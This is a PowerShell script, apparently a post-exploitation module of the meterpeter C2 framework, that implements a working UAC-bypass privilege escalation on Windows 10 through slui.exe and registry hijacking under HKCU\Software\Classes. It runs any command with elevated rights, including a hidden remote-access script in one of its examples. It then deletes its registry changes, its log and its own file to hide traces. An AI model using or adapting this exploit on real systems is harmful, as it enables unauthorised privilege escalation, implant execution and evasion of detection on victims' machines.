<#
.SYNOPSIS
   SluiEOP can be used to escalate privileges or to execute a command with high integrity (SYSTEM)

   Author: r00t-3xp10it (SSA RedTeam @2020)
   Tested Under: Windows 10 - 18363.778
   EOP Disclosure By: @mattharr0ey
   Required Dependencies: none
   Optional Dependencies: none
   PS Script Dev Version: v1.7

.DESCRIPTION
   How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
   called Windows Activation in SystemSettings, this service makes it easy for you and other users to change an old windows
   activation key to a new one, the tool (ChangePK) doesn’t open itself with high privilege but there is another tool opens
   ChangePK with high privileges named sliu.exe Slui doesn’t support a feature that runs it as administrator automatically,
   but we can do that manually by either clicking on slui with a right click and click on “Run as administrator” or using:
   powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas

.NOTES
   SluiEOP script was written as one meterpeter C2 Post-Exploitation module.
   This script 'reverts' regedit hacks to the previous state before the EOP.
   To run child binaries (.exe) through this module use: cmd /c start bin.exe

.EXAMPLE
   PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
   Execute notepad process with high privileges (SYSTEM)

.EXAMPLE
   PS C:\> ./SluiEOP.ps1 "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
   Execute powershell process with high privileges (SYSTEM)

.EXAMPLE
   PS C:\> ./SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
   Execute $env:TMP\MyRat.ps1 script with high privileges (SYSTEM) in an hidden console.

.INPUTS
   None. You cannot pipe objects into SluiEOP.ps1

.OUTPUTS
   If exec outside meterpeter C2 .. Gets the spawned <arch> <ProcessName> and <PID>

.LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/SluiEOP.ps1
    https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b
#>


$Command = $Null
$Success = $False
$param1 = $args[0] # User Inputs [<arguments>]
If(-not($param1) -or $param1 -eq $null){
   $Command = "$env:WINDIR\System32\cmd.exe"
   If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
       Write-Host "[ ERROR ] SYNTAX: SluiEOP.ps1 `"Command to execute`"" -ForegroundColor Red -BackgroundColor Black
    }
}Else{
   $Command = "$param1"
}

## Check for Vulnerability existence before continue any further ..
$CheckVuln = Test-Path -Path "HKCU:\Software\Classes" -EA SilentlyContinue
If($CheckVuln -eq $True){

   ## For those who run SluiEOP outside meterpeter C2
   If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
      Write-Host "SluiEOP v1.7 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
      Write-Host "[+] Executing Command: '$Command'"
      # Output Detailed Info on screen
   }

   ### Add Entrys to Regedit { using powershell }
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Milliseconds 650
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 650
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 650
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 650
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 650

   ## The Next Registry entry allow us to execute our command under high privileges (SYSTEM)
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   # ---
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Milliseconds 650
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Milliseconds 650
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Name "(default)" -Value '{470C0EBD-5D73-4d58-9CED-E91E22E23282}' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Milliseconds 700
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 650

   ### Start the vulnerable Process { using powershell }
   Start-Sleep -Milliseconds 3000;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas

   Start-Sleep -Milliseconds 2700 # Give time for Slui.exe to finish
   ### Revert Regedit to 'DEFAULT' settings after EOP finished ..
   Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
   Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force

   <#
   .SYNOPSIS
      Helper - Get the spawned <arch> <ProcessName> and <PID>
      Author: @r00t-3xp10it

   .DESCRIPTION
      Displays Detailed Info (Arch|ProcessName|PID) for those who run SluiEOP
      outside meterpeter C2 And 'Basic' Information to meterpeter C2 users.

   .EXAMPLE
      PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"

      Architecture ProccessName PID
      ------------ ------------ ---
      AMD64        notepad      5543
   #>

   If($Command -match ' ' -and $Command -match 'cmd'){
      ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
      $ParsingData = $Command -Split(' ')
      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
      If($ProcessName -match '.exe'){
         $ProcessName = $ProcessName -replace '.exe',''
         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         If($EOPID -match '[0-9]'){$Success = $True}
      }Else{
         $EOPID = "null"
      }
   }
   ElseIf(-not($Command -match ' ') -and $Command -match '\\'){
      ## String: "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
      $ProcessName = Split-Path "$Command" -Leaf
      If($ProcessName -match '.exe'){
         $ProcessName = $ProcessName -replace '.exe',''
         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         If($EOPID -match '[0-9]'){$Success = $True}
      }Else{
         $EOPID = "null"
      }
   }
   ElseIf($Command -match '^[powershell]' -and $Command -match ' ' -and $Command -match '.ps1' -or $Command -match '.bat' -or $Command -match '.py'){
      ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
      $ParsingData = $Command -Split('\\')
      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
      $Success = $True
      $EOPID = "null {script exec}"
   }
   Else{
      ## String: "powershell.exe"
      $ProcessName = Split-Path "$Command" -Leaf
      If($ProcessName -match '.exe'){
         $ProcessName = $ProcessName -replace '.exe',''
         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         If($EOPID -match '[0-9]'){$Success = $True}
      }Else{
         $EOPID = "null"
      }
   }

   ## For those who run SluiEOP outside meterpeter C2
   If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
      ## Build MY PSObject Table
      # IF executed outside meterpeter C2 framework
      $MYPSObjectTable = New-Object -TypeName PSObject
      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$env:PROCESSOR_ARCHITECTURE"
      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
      $MYPSObjectTable
   }Else{
      ## Build meterpeter Table
      If($Success -eq $True){
         echo "   system  success  Process PID returned: $EOPID" > $env:TMP\sLUIEop.log
      }Else{
         echo "   system  error?   Process PID not returned" > $env:TMP\sLUIEop.log
      }
   }

}Else{
   ## Vulnerable registry hive => not found
   echo "   ERROR    System Doesn't Seems Vulnerable, Aborting." > $env:TMP\sLUIEop.log
}

## Clean old files/configurations left behind after EOP finished ..
If(Test-Path "$env:TMP\sLUIEop.log"){Get-Content -Path "$env:TMP\sLUIEop.log" -EA SilentlyContinue;Remove-Item -Path "$env:TMP\sLUIEop.log" -Force -EA SilentlyContinue}
If(Test-Path "$env:TMP\SluiEOP.ps1"){Remove-Item -Path "$env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
Exit
